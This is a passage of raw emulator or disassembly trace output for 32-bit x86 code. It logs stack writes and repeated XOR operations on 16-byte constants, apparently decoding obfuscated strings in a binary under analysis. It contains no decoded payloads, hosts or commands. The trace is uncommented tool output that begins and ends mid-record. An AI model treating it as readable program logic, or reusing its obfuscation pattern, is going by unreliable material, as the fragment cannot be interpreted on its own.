-0x1a0 and offset 0x82f4 for stack size 0x10000 saving data to stack: 184630637 4 0x45ca50: mov dword ptr [esp + 0x2f8], 0x8efa3fbc, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82f8 for stack size 0x10000 saving data to stack: 2398764988 4 0x45ca5b: mov dword ptr [esp + 0x2fc], 0x171842ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a0 and offset 0x82fc for stack size 0x10000 saving data to stack: 387465965 4 0x45ca66: push 0x10, regs_read: [30], regs_write: [30] 0x45ca68: mov dword ptr [esp + 0x434], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8434 for stack size 0x10000 saving data to stack: 914789047 4 0x45ca73: mov dword ptr [esp + 0x438], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8438 for stack size 0x10000 saving data to stack: 896093928 4 0x45ca7e: mov dword ptr [esp + 0x43c], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x843c for stack size 0x10000 saving data to stack: 929680980 4 0x45ca89: mov dword ptr [esp + 0x440], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8440 for stack size 0x10000 saving data to stack: 1389027477 4 0x45ca94: movaps xmm1, xmmword ptr [esp + 0x434], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x8434 for stack size 0x10000 0x45ca9c: pxor xmm1, xmmword ptr [esp + 0x2b4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x82b4 for stack size 0x10000 0x45caa5: movaps xmmword ptr [esp + 0x2b4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x82b4 for stack size 0x10000 saving data to stack: 129508446339581620068653171830233588046 16 0x45caad: mov dword ptr [esp + 0x20], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8020 for stack size 0x10000 saving data to stack: 929680980 4 0x45cab1: pop eax, regs_read: [30], regs_write: [30, 19] 0x45cab9: push dword ptr [esp + 0x1c], regs_read: [30], regs_write: [30] 0x45cacc: mov dword ptr [esp + 0x444], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8444 for stack size 0x10000 saving data to stack: 1913178889 4 0x45cae6: mov dword ptr [esp + 0x448], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8448 for stack size 0x10000 saving data to stack: 2231344414 4 0x45cb07: mov dword ptr [esp + 0x44c], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x844c for stack size 0x10000 saving data to stack: 586689126 4 0x45cb22: mov dword ptr [esp + 0x450], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8450 for stack size 0x10000 saving data to stack: 1701587195 4 0x45cb2d: movaps xmm1, xmmword ptr [esp + 0x444], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x8444 for stack size 0x10000 0x45cb35: pxor xmm1, xmmword ptr [esp + 0x2c4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x82c4 for stack size 0x10000 0x45cb46: movaps xmmword ptr [esp + 0x2c4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x82c4 for stack size 0x10000 saving data to stack: 49348773999034683645166426887967892845 16 0x45cb4e: mov dword ptr [esp + 0x454], 0x23eb7d5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8454 for stack size 0x10000 saving data to stack: 602635611 4 0x45cb59: mov dword ptr [esp + 0x458], 0x72f07224, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8458 for stack size 0x10000 saving data to stack: 1928360484 4 0x45cb64: mov dword ptr [esp + 0x45c], 0x8b09cf88, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x845c for stack size 0x10000 saving data to stack: 2332675976 4 0x45cb6f: mov dword ptr [esp + 0x460], 0x299641e1, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8460 for stack size 0x10000 saving data to stack: 697713121 4 0x45cb7a: movaps xmm1, xmmword ptr [esp + 0x454], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x8454 for stack size 0x10000 0x45cb82: pxor xmm1, xmmword ptr [esp + 0x2d4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x82d4 for stack size 0x10000 0x45cb8b: movaps xmmword ptr [esp + 0x2d4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x82d4 for stack size 0x10000 saving data to stack: 152037004032645864514563623890719477107 16 0x45cb93: mov dword ptr [esp + 0x464], 0x495cbfdd, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8464 for stack size 0x10000 saving data to stack: 1230815197 4 0x45cb9e: mov dword ptr [esp + 0x468], 0xa0ce46da, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8468 for stack size 0x10000 saving data to stack: 2697873114 4 0x45cba9: mov dword ptr [esp + 0x46c], 0xdbf0b70a, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x846c for stack size 0x10000 saving data to stack: 3689985802 4 0x45cbb4: mov dword ptr [esp + 0x470], 0xfaf5f097, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a4 and offset 0x8470 for stack size 0x10000 saving data to stack: 4210421911 4 0x45cbbf: movaps xmm1, xmmword ptr [esp + 0x464], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x8464 for stack size 0x10000 0x45cbc7: pxor xmm1, xmmword ptr [esp + 0x2e4], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1a4 and offset 0x82e4 for stack size 0x10000 0x45cbd0: push edi, regs_read: [30, 23], regs_write: [30] 0x45cbd1: mov dword ptr [esp + 0x478], 0xe79dbb1f, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a8 and offset 0x8478 for stack size 0x10000 saving data to stack: 3885873951 4 0x45cbdc: mov dword ptr [esp + 0x47c], 0xb013760, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a8 and offset 0x847c for stack size 0x10000 saving data to stack: 184629088 4 0x45cbe7: mov dword ptr [esp + 0x480], 0x8efa3fbc, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a8 and offset 0x8480 for stack size 0x10000 saving data to stack: 2398764988 4 0x45cbf2: mov dword ptr [esp + 0x484], 0x171842ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x1a8 and offset 0x8484 for stack size 0x10000 saving data to stack: 387465965 4 0x45cbfd: movaps xmmword ptr [esp + 0x2e8], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1a8 and offset 0x82e8 for stack size 0x10000 saving data to stack: 42838790702651714639275359060541586020 16 0x45cc05: movaps xmm1, xmmword ptr [esp + 0x478], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1a8 and offset 0x8478 for stack size 0x10000 0x45cc0d: pxor xmm1, xmmword ptr [esp + 0x2f8], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1a8 and offset 0x82f8 for stack size 0x10000 0x45cc16: push esi, regs_read: [30, 29], regs_write: [30] 0x45cc17: push edx, regs_read: [30, 24], regs_write: [30] 0x45cc18: movaps xmmword ptr [esp + 0x300], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1b0 and offset 0x8300 for stack size 0x10000 saving data to stack: 11051119506213 16 0x45cc20: push ecx, regs_read: [30, 22], regs_write: [30] 0x45cc21: mov edi, dword ptr [esp + 0x8c], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x1b4 and offset 0x808c for stack size 0x10000 0x45cc28: push eax, regs_read: [30, 19], regs_write: [30] 0x45cc30: push eax, regs_read: [30, 19], regs_write: [30] 0x45cc31: push edi, regs_read: [30, 23], regs_write: [30] 0x45cc95: push eax, regs_read: [30, 19], regs_write: [30] 0x45ccaa: push edi, regs_read: [30, 23], regs_write: [30] 0x45ccb0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45ccb1: mov edi, dword ptr [esp + 0x18], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x1c4 and offset 0x8018 for stack size 0x10000 0x45ccb5: mov byte ptr [esp + 0x17], 1, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c4 and offset 0x8017 for stack size 0x10000 saving data to stack: 1 1 0x45ccc6: mov eax, dword ptr [esp + 0xa0], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x1c4 and offset 0x80a0 for stack size 0x10000 0x45ccf6: push eax, regs_read: [30, 19], regs_write: [30] 0x45cd14: mov eax, dword ptr [esp + 0x74], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x1c8 and offset 0x8074 for stack size 0x10000 0x45cd35: push ecx, regs_read: [30, 22], regs_write: [30] 0x45cd42: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45cd4f: pop edi, regs_read: [30], regs_write: [30, 23] 0x45cd52: pop esi, regs_read: [30], regs_write: [30, 29] 0x45cd53: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x1c0 and offset 0x8000 for stack size 0x10000 0x45cd55: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45cd57: push ebp, regs_read: [30, 20], regs_write: [30] 0x45cd58: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x45cd63: push esi, regs_read: [30, 29], regs_write: [30] 0x45cd64: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45cd69: mov dword ptr [esp + 0xcc], 0x42f3d3eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x80cc for stack size 0x10000 saving data to stack: 1123275755 4 0x45cd74: mov dword ptr [esp + 0xd0], 0x59002887, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x80d0 for stack size 0x10000 saving data to stack: 1493182599 4 0x45cd86: mov dword ptr [esp + 0xd4], 0x3769ce38, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x80d4 for stack size 0x10000 saving data to stack: 929680952 4 0x45cd98: mov dword ptr [esp + 0xd8], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x4 and offset 0x80d8 for stack size 0x10000 saving data to stack: 1389027477 4 0x45cd9f: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45cda4: movaps xmm1, xmmword ptr [esp + 0xcc], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x80cc for stack size 0x10000 0x45cdac: push edi, regs_read: [30, 23], regs_write: [30] 0x45cdad: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x45cdb7: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45cdbf: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45cdc7: mov dword ptr [esp + 0x1c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cdcb: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 0x45cdd1: push eax, regs_read: [30, 19], regs_write: [30] 0x45cdd2: mov dword ptr [esp + 0x10], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45cdd6: movaps xmmword ptr [esp + 0xd4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x80d4 for stack size 0x10000 saving data to stack: 2000060247618163655004 16 0x45cdf2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45cdfb: push edi, regs_read: [30, 23], regs_write: [30] 0x45cdfc: push eax, regs_read: [30, 19], regs_write: [30] 0x45ce0b: mov ecx, 0x4f0820, regs_read: (), regs_write: [22] 0x45ce10: mov byte ptr [esp + 0xb], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0x10 and offset 0x800b for stack size 0x10000 saving data to stack: 0 1 0x45ce2f: mov ecx, 0x4f0820, regs_read: (), regs_write: [22] 0x45ce39: mov eax, dword ptr [esp + 0x38], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x8038 for stack size 0x10000 0x45ce3d: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45ce3f: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x8028 for stack size 0x10000 saving data to stack: 1389027477 4 0x45ce50: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x10 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ce60: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ce73: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ce75: push eax, regs_read: [30, 19], regs_write: [30] 0x45ce82: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ce84: push eax, regs_read: [30, 19], regs_write: [30] 0x45ce9c: mov esi, eax, regs_read: [19], regs_write: [29] 0x45cea7: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ceae: mov eax, dword ptr [esp + 0x30], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x18 and offset 0x8030 for stack size 0x10000 0x45ceb2: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45ceb4: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x8024 for stack size 0x10000 saving data to stack: 1389027477 4 0x45cec3: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45cedb: mov dword ptr [esp + 0x50], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x18 and offset 0x8050 for stack size 0x10000 saving data to stack: 914789096 4 0x45cee3: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45cee8: mov dword ptr [esp + 0xc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x45ceec: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45cef1: mov dword ptr [esp + 0x58], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x8058 for stack size 0x10000 saving data to stack: 929680980 4 0x45cef5: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45cefa: mov dword ptr [esp + 0x5c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x805c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cefe: mov dword ptr [esp + 0x54], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x8054 for stack size 0x10000 saving data to stack: 896093928 4 0x45cf02: movaps xmm1, xmmword ptr [esp + 0x50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x18 and offset 0x8050 for stack size 0x10000 0x45cf07: mov dword ptr [esp + 0x188], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x18 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x45cf15: mov dword ptr [esp + 0x18c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x18 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cf1c: mov dword ptr [esp + 0x180], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x18 and offset 0x8180 for stack size 0x10000 saving data to stack: 914789047 4 0x45cf27: mov dword ptr [esp + 0x184], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x18 and offset 0x8184 for stack size 0x10000 saving data to stack: 896093928 4 0x45cf2e: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x18 and offset 0x8180 for stack size 0x10000 0x45cf37: push edx, regs_read: [30, 24], regs_write: [30] 0x45cf3c: movaps xmmword ptr [esp + 0x54], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1c and offset 0x8054 for stack size 0x10000 saving data to stack: 95 16 0x45cf46: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45cf53: push 0x4dc577, regs_read: [30], regs_write: [30] 0x45cf58: mov dword ptr [esp + 0x10], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x8010 for stack size 0x10000 saving data to stack: 896093928 4 0x45cf61: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45cf66: mov dword ptr [esp + 0x80], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8080 for stack size 0x10000 saving data to stack: 914813120 4 0x45cf71: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45cf76: mov dword ptr [esp + 0x84], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45cf7d: mov dword ptr [esp + 0x88], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45cf84: mov edi, eax, regs_read: [19], regs_write: [23] 0x45cf86: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45cf8b: mov dword ptr [esp + 0x194], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x45cf92: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cf99: mov dword ptr [esp + 0x198], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x45cfa0: mov dword ptr [esp + 0x19c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cfa7: mov dword ptr [esp + 0x190], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8190 for stack size 0x10000 saving data to stack: 914789047 4 0x45cfb2: movaps xmm1, xmmword ptr [esp + 0x190], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8190 for stack size 0x10000 0x45cfba: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8080 for stack size 0x10000 0x45cfc3: movaps xmmword ptr [esp + 0x80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1c and offset 0x8080 for stack size 0x10000 saving data to stack: 25207 16 0x45cfcb: mov dword ptr [esp + 0x104], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8104 for stack size 0x10000 saving data to stack: 896093928 4 0x45cfd2: mov dword ptr [esp + 0x108], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45cfd9: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cfe0: mov dword ptr [esp + 0x74], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45cfe4: mov dword ptr [esp + 0x78], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45cfe8: mov dword ptr [esp + 0x7c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45cfec: mov dword ptr [esp + 0x100], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8100 for stack size 0x10000 saving data to stack: 914789047 4 0x45cff7: movaps xmm1, xmmword ptr [esp + 0x100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8100 for stack size 0x10000 0x45cfff: mov dword ptr [esp + 0x70], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8070 for stack size 0x10000 saving data to stack: 1124001433 4 0x45d007: pxor xmm1, xmmword ptr [esp + 0x70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8070 for stack size 0x10000 0x45d00d: mov dword ptr [esp + 0x114], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45d014: mov dword ptr [esp + 0x118], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45d01b: mov dword ptr [esp + 0x11c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d022: movaps xmmword ptr [esp + 0x70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x1c and offset 0x8070 for stack size 0x10000 saving data to stack: 1954051118 16 0x45d027: mov dword ptr [esp + 0x6c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d02f: mov dword ptr [esp + 0x64], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x8064 for stack size 0x10000 saving data to stack: 896093928 4 0x45d03a: mov dword ptr [esp + 0x68], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x45d045: mov dword ptr [esp + 0x110], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8110 for stack size 0x10000 saving data to stack: 914789047 4 0x45d050: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8110 for stack size 0x10000 0x45d058: mov dword ptr [esp + 0x60], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x1c and offset 0x8060 for stack size 0x10000 saving data to stack: 914789099 4 0x45d060: pxor xmm1, xmmword ptr [esp + 0x60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x1c and offset 0x8060 for stack size 0x10000 0x45d066: push eax, regs_read: [30, 19], regs_write: [30] 0x45d067: movaps xmmword ptr [esp + 0x64], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x20 and offset 0x8064 for stack size 0x10000 saving data to stack: 92 16 0x45d071: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d072: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x45d076: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45d07d: push eax, regs_read: [30, 19], regs_write: [30] 0x45d08a: push edi, regs_read: [30, 23], regs_write: [30] 0x45d092: push eax, regs_read: [30, 19], regs_write: [30] 0x45d093: push dword ptr [esp + 0x34], regs_read: [30], regs_write: [30] 0x45d0a7: push eax, regs_read: [30, 19], regs_write: [30] 0x45d0b4: push eax, regs_read: [30, 19], regs_write: [30] 0x45d0df: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d0e0: push eax, regs_read: [30, 19], regs_write: [30] 0x45d0e6: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d0e7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d0ef: mov edi, eax, regs_read: [19], regs_write: [23] 0x45d11a: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x38 and offset 0x800c for stack size 0x10000 0x45d12c: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x38 and offset 0x800c for stack size 0x10000 saving data to stack: 1601206373 4 0x45d135: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x38 and offset 0x800c for stack size 0x10000 0x45d147: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x38 and offset 0x800c for stack size 0x10000 saving data to stack: 1601206373 4 0x45d15f: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d161: push eax, regs_read: [30, 19], regs_write: [30] 0x45d16e: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d170: push eax, regs_read: [30, 19], regs_write: [30] 0x45d17d: push eax, regs_read: [30, 19], regs_write: [30] 0x45d192: mov esi, 0x368692b7, regs_read: (), regs_write: [29] 0x45d197: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45d19c: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d1a1: mov dword ptr [esp + 0x120], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x8120 for stack size 0x10000 saving data to stack: 914789047 4 0x45d1a8: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d1ad: mov dword ptr [esp + 0x124], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x44 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45d1b4: mov dword ptr [esp + 0x128], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x44 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45d1bb: mov dword ptr [esp + 0x12c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d1c2: mov dword ptr [esp + 0x140], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x8140 for stack size 0x10000 saving data to stack: 914789047 4 0x45d1c9: mov dword ptr [esp + 0x144], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x44 and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45d1d0: mov dword ptr [esp + 0x148], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x44 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45d1d7: mov dword ptr [esp + 0x14c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d1de: mov dword ptr [esp + 0x160], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x8160 for stack size 0x10000 saving data to stack: 914789047 4 0x45d1e5: mov dword ptr [esp + 0x164], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x44 and offset 0x8164 for stack size 0x10000 saving data to stack: 896093928 4 0x45d1ec: mov dword ptr [esp + 0x168], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x44 and offset 0x8168 for stack size 0x10000 saving data to stack: 929680980 4 0x45d1f3: mov dword ptr [esp + 0x16c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x816c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d206: push 0x4dc589, regs_read: [30], regs_write: [30] 0x45d212: mov esi, eax, regs_read: [19], regs_write: [29] 0x45d219: push 0x4dc58a, regs_read: [30], regs_write: [30] 0x45d22a: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8120 for stack size 0x10000 0x45d239: mov dword ptr [esp + 0x90], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8090 for stack size 0x10000 saving data to stack: 1407972313 4 0x45d244: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d246: mov dword ptr [esp + 0x94], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45d251: mov dword ptr [esp + 0x98], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45d25c: mov dword ptr [esp + 0x9c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d267: pxor xmm1, xmmword ptr [esp + 0x90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x8090 for stack size 0x10000 0x45d270: push eax, regs_read: [30, 19], regs_write: [30] 0x45d271: movaps xmmword ptr [esp + 0x94], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x50 and offset 0x8094 for stack size 0x10000 saving data to stack: 137760366997177718412358821909698966489 16 0x45d287: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45d28c: mov dword ptr [esp + 0xa0], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x80a0 for stack size 0x10000 saving data to stack: 1407972313 4 0x45d297: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d29c: mov dword ptr [esp + 0xa4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x50 and offset 0x80a4 for stack size 